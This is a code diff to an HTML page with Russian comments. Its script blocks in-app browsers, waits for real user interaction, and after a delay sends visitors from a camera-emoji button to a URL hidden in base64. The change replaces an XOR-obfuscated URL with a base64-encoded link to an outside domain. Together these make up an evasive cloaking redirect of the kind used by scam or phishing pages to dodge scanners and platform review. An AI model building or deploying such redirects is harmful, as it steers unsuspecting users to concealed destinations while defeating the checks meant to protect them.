@@ -32,7 +32,7 @@
   <button class="btn" onclick="go()">📷</button>
 
   <script>
-    // 🔐 Защита от встроенных браузеров
+    // Блокировка встроенных браузеров
     (function() {
       const ua = navigator.userAgent.toLowerCase();
       const isWebview =
@@ -53,26 +53,18 @@
       }
     })();
 
-    // 👤 Проверка взаимодействия
+    // Проверка взаимодействия
     let interacted = false;
     document.addEventListener("mousemove", () => interacted = true);
     document.addEventListener("touchstart", () => interacted = true);
     document.addEventListener("keypress", () => interacted = true);
 
-    // 🚀 Редирект с расшифровкой
     function go() {
       if (!interacted) return;
 
       setTimeout(() => {
-        const encoded = "FDcVEhQbSRpVDBUbU0cME1BdDglbFlcHVRgBFQ=="; // зашифрованный URL
-        const xorKey = 3;
-
-        const base64Decoded = atob(encoded);
-        const finalURL = base64Decoded
-          .split('')
-          .map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey))
-          .join('');
-
+        const encoded = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // base64 от https://gayron.life/rehbixee
+        const finalURL = atob(encoded);
         window.location.href = finalURL;
       }, 2000);
     }
